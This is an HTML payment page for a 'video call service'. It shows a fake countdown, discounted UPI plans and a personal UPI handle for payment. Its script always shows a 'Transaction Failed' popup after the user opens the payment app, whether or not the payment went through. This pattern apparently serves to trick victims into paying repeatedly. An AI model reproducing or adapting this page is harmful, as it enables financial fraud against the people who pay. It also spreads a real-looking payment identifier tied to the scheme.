<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Video Call Payment</title>
<style>
  body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: linear-gradient(-45deg, #0f2027, #203a43, #2c5364, #1b2735);
    background-size: 400% 400%;
    animation: gradientBG 12s ease infinite;
    font-family: 'Poppins', sans-serif;
    overflow-x: hidden;
  }
  @keyframes gradientBG {
    0% {background-position:0% 50%;}
    50% {background-position:100% 50%;}
    100% {background-position:0% 50%;}
  }

  /* Popup Common */
  .popup {
    display: flex;
    position: fixed; z-index: 999;
    left: 0; top: 0; width: 100%; height: 100%;
    background: rgba(0,0,0,0.85);
    align-items: center; justify-content: center;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.3s ease;
  }
  .popup.show {
    opacity: 1;
    pointer-events: all;
  }
  .popup-content {
    background: #111; color: #fff;
    padding: 25px; border-radius: 20px;
    width: 270px; text-align: center;
    box-shadow: 0 0 30px cyan; position: relative;
    transform: scale(0.8);
    transition: transform 0.3s ease;
  }
  .popup.show .popup-content {
    transform: scale(1);
  }
  .close { position: absolute; top: 12px; right: 15px; cursor: pointer; font-size: 20px; }

  .timer { margin: 12px 0; color: #00ff6a; font-weight: bold; font-size: 16px; }

  /* Plans */
  .plans { display: flex; gap: 12px; margin: 18px 0; justify-content: center; }
  .plan-card {
    flex: 1; background: rgba(255,255,255,0.05);
    border: 1px solid cyan; border-radius: 12px;
    padding: 12px; cursor: pointer; transition: 0.3s;
  }
  .plan-card:hover { box-shadow: 0 0 20px cyan; }
  .plan-card input { display: none; }
  .plan-card label { display: block; cursor: pointer; }

  .offer { color: #00ffea; font-weight: bold; }

  .upi-info {
    background: rgba(0,255,255,0.05); border: 1px dashed cyan;
    padding: 12px; margin-bottom: 14px; border-radius: 10px;
    font-size: 14px;
  }
  .upi-info code { background: #111; padding: 3px 6px; border-radius: 6px; }

  .buy-btn {
    display: inline-block; padding: 12px 18px;
    background: cyan; color: #111;
    border-radius: 10px; font-weight: bold; text-decoration: none;
    transition: 0.3s;
  }
  .buy-btn:hover { background: #00ff6a; }

  /* Failed Popup */
  .failed { color: #f87171; font-weight: bold; font-size: 18px; margin-top: 10px; }
</style>
</head>
<body>

<!-- Main Payment Popup -->
<div id="videoPopup" class="popup show">
  <div class="popup-content">
    <span class="close" onclick="closePopup()">&times;</span>
    <h2>üé• Video Call Service</h2>
    <div class="timer">‚è≥ Offer Ends In: <span id="countdown">30:00</span></div>

    <div class="plans">
      <div class="plan-card">
        <input type="radio" name="plan" value="200" id="plan200" checked>
        <label for="plan200">
          <h3>15 Minutes</h3>
          <p><del>‚Çπ400</del> <span class="offer">‚Çπ200</span></p>
        </label>
      </div>
      <div class="plan-card">
        <input type="radio" name="plan" value="300" id="plan300">
        <label for="plan300">
          <h3>30 Minutes</h3>
          <p><del>‚Çπ600</del> <span class="offer">‚Çπ300</span></p>
        </label>
      </div>
    </div>

    <div class="upi-info">
      Pay securely to:<br>
      <strong>Mushkan</strong><br>
      <code>mushkanbabu@ybl</code>
    </div>

    <a id="bookNowBtn" href="#" class="buy-btn">Pay ‚Çπ200</a>
  </div>
</div>

<!-- Transaction Failed Popup -->
<div id="failedPopup" class="popup">
  <div class="popup-content">
    <span class="close" onclick="closeFailed()">&times;</span>
    <h2>Payment Status</h2>
    <p class="failed">‚ùå Transaction Failed</p>
  </div>
</div>

<script>
  const bookNowBtn = document.getElementById("bookNowBtn");
  const failedPopup = document.getElementById("failedPopup");
  const videoPopup = document.getElementById("videoPopup");
  const countdownEl = document.getElementById("countdown");

  let countdownInterval;
  let transactionFailed = false; // flag for failed transaction

  // Close popup and go back
  function closePopup(){ 
    videoPopup.classList.remove("show"); 
    history.back(); // go to previous page
  }
  function closeFailed(){ 
    failedPopup.classList.remove("show"); 
    history.back(); // go to previous page
  }

  // Countdown Timer
  function startCountdown(seconds) {
    let remaining = seconds;
    function update() {
      let mins = Math.floor(remaining / 60);
      let secs = remaining % 60;
      countdownEl.textContent = `${mins}:${secs < 10 ? "0" : ""}${secs}`;
      if(remaining > 0) remaining--;
    }
    update();
    countdownInterval = setInterval(update, 1000);
  }
  startCountdown(30*60);

  // Plan selection logic
  document.querySelectorAll("input[name='plan']").forEach(radio => {
    radio.addEventListener("change", function() {
      let price = this.value;
      let paymentLink = `upi://pay?pa=mushkanbabu@ybl&pn=Mushkan&am=${price}&cu=INR`;
      bookNowBtn.href = paymentLink;
      bookNowBtn.textContent = `Pay ‚Çπ${price}`;
    });
  });

  // Handle "Pay" click (simulate failed transaction)
  bookNowBtn.addEventListener("click", function() {
    transactionFailed = true;  // mark as failed
    closePopup();               // close video popup
    // UPI app opens automatically
  });

  // Show failed popup when user returns to page
  window.addEventListener('focus', () => {
    if(transactionFailed) {
      failedPopup.classList.add("show");
      transactionFailed = false;
    }
  });
</script>

</body>
</html>
